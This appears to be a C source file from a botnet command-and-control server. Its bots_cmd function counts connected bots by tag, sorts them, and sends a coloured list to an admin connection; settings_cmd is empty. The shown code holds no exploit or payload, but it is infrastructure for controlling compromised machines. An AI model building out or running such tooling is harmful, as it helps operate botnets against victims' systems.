#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#include "headers.h"
#include "commands.h"


void bots_cmd(AdminArgs *admin, unsigned char **argv, int argc) {
    typedef struct {
        char tag[20];
        int count;
    } UniqueTag;

    int numBots = 0;
    BotInfo *bots = retrieve_all_bots(&numBots);

    // Create a dynamic array to hold the unique tags and their counts
    UniqueTag* uniqueTags = NULL;
    int numUniqueTags = 0;

    for (int i = 0; i < numBots; i++) {
        if(bots[i].connected == FALSE) {
            continue;
        }
        int foundTagIndex = -1;
        for (int j = 0; j < numUniqueTags; j++) {
            if (strcmp(bots[i].tag, uniqueTags[j].tag) == 0) {
                foundTagIndex = j;
                break;
            }
        }

        if (foundTagIndex == -1) {
            // Reallocate memory for one additional tag
            UniqueTag* temp = realloc(uniqueTags, (numUniqueTags + 1) * sizeof(UniqueTag));
            if (temp == NULL) {
                printf("Memory allocation failed!\n");
                return;
            }
            uniqueTags = temp;

            // Copy the tag and set its count to 1
            strncpy(uniqueTags[numUniqueTags].tag, bots[i].tag, sizeof(uniqueTags[numUniqueTags].tag));
            uniqueTags[numUniqueTags].count = 1;
            numUniqueTags++;
        } else {
            uniqueTags[foundTagIndex].count++;
        }
    }

    // Sort the tags alphabetically using bubble sort
    for (int i = 0; i < numUniqueTags - 1; i++) {
        for (int j = 0; j < numUniqueTags - i - 1; j++) {
            if (strcmp(uniqueTags[j].tag, uniqueTags[j + 1].tag) > 0) {
                UniqueTag temp = uniqueTags[j];
                uniqueTags[j] = uniqueTags[j + 1];
                uniqueTags[j + 1] = temp;
            }
        }
    }

    // Format the output string with colors and formatting
    const int bufferSize = 1000;
    char buffer[bufferSize];
    snprintf(buffer, bufferSize, "\033[1;34mList of connected bots:\n\033[0m");
    for (int i = 0; i < numUniqueTags; i++) {
        snprintf(buffer + strlen(buffer), bufferSize - strlen(buffer),
                 "\n\033[1;32m%s: %d\033[0m\n", uniqueTags[i].tag, uniqueTags[i].count);
    }

    // Print the formatted output
    send(admin->fd, buffer, strlen(buffer), 0);

    // Free the dynamically allocated memory
    free(uniqueTags);
}


void settings_cmd(AdminArgs *admin, unsigned char **argv, int argc)
{

}
